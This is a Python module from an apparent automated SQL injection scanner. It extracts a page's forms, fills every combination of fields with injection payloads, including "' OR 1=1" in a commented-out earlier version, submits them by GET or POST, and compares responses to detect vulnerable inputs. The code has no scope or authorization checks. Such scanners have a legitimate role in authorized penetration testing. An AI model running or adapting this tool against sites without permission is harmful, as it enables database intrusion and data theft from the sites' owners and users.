

'''
def perform_injection(url, payload = "' OR 1=1"):
    results = []
    form_data = extract_form_data.extract_data(url)
    before_response = scraper.get(url)

    for form in form_data:
        fields = list(form["fields"].keys())
        for i in range(1, len(fields) + 1):
            for combo in itertools.combinations(fields, i):
                data = form["fields"].copy()
                for field in combo:
                    data[field] = payload
                    if form["method"] == "post":
                        after_response = scraper.post(form["action"], data=data)
                        after_injection_content = after_response.text
                    else:
                        after_response = scraper.get(form["action"], params=data)
                    result = analyze_module.analyze_response(before_response, after_response, list(combo), payload)
                    results.append(result)


    return results
'''
import itertools
'''import extract_form_data
from extract_form_data import scraper
import analyze_module'''
from sqli import payloads

from sqli import extract_form_data
from sqli.extract_form_data import scraper
from sqli import analyze_module

def perform_injection(url):
    results = []
    payload_list = payloads.payloads
    form_data = extract_form_data.extract_data(url)
    before_response = scraper.get(url)

    for form in form_data:
        fields = list(form["fields"].keys())
        for i in range(1, len(fields) + 1):
            for combo in itertools.combinations(fields, i):
                for payload in payload_list:
                    data = form["fields"].copy()
                    for field in combo:
                        data[field] = payload
                    if form["method"] == "post":
                        after_response = scraper.post(form["action"], data=data)
                    else:
                        after_response = scraper.get(form["action"], params=data)
                    result = analyze_module.analyze_response(before_response, after_response, list(combo), payload)
                    results.append(result)

    return results
